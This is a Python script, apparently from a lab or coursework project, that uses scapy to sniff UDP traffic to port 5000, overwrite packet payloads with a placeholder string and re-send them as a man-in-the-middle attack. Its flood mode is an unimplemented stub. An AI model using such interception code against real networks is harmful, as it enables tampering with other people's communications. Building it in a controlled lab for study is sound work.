import sys
sys.path.append(".")
from dataclasses import dataclass
from enum import Enum, auto
import datetime as dt
from scapy.fields import IntEnumField, ShortField, XByteField
from scapy.sendrecv import AsyncSniffer, send
from TheManInTheMiddle.ApplyAndSend import apply
from Attacks.FieldModification import modify_field
from scapy.packet import Packet, Raw

class Source(Enum):
    CLIENT = auto()
    SERVER = auto()

class Attack(Enum):
    OVERWRITE = auto()
    FLOOD = auto()
    
@dataclass
class InterceptedPacket:
    received_packet: Packet
    modified_packet: Packet
    timestamp: dt.datetime
    source: Source
    
class Interceptor:
    intercepted_packets: list[InterceptedPacket] = []
    last_modified_payload = b""
    attack_type: Attack | None = None
    sniffer: AsyncSniffer
    
    def __init__(self):
        self.sniffer = AsyncSniffer(
            prn=self.handle_packet,
            store=False,
            filter="udp and dst port 5000"
        )

    def attack(self, packet: Packet) -> Packet:
        if packet.haslayer(Raw):
            if self.attack_type == Attack.OVERWRITE:
                packet[Raw].load = b"Modified payload"
            elif self.attack_type == Attack.FLOOD:
                # TODO - Implement flood attack logic
                pass
            self.last_modified_payload = packet[Raw].load
        else:
            print("No Raw layer found in packet, cannot modify.", flush=True)
        return packet

    def handle_packet(self, packet: Packet):
        original_packet = packet.copy()
        if self.attack_type is None:
            print("Received packet, but no attack selected.", flush=True)
            return
        if packet[Raw].load != self.last_modified_payload:
            modified_packet = apply(packet, self.attack)
            self.intercepted_packets.append(InterceptedPacket(
                received_packet=original_packet,
                modified_packet=modified_packet,
                timestamp=dt.datetime.now(),
                source = Source.CLIENT
            ))
            send(modified_packet)
            print("Packet intercepted and modified:", modified_packet.summary(), flush=True)
        else:
            print("Packet already modified, skipping to avoid loop.", flush=True)

if __name__ == "__main__":
    interceptor = Interceptor()
    interceptor.attack_type = Attack.OVERWRITE  # Change this to Attack.FLOOD to test flood attack
    interceptor.sniffer.start()
    print("Interceptor is running. Press Ctrl+C to stop.", flush=True)
    try:
        while True:
            pass
    except KeyboardInterrupt:
        interceptor.sniffer.stop()
        print("Interceptor stopped.", flush=True)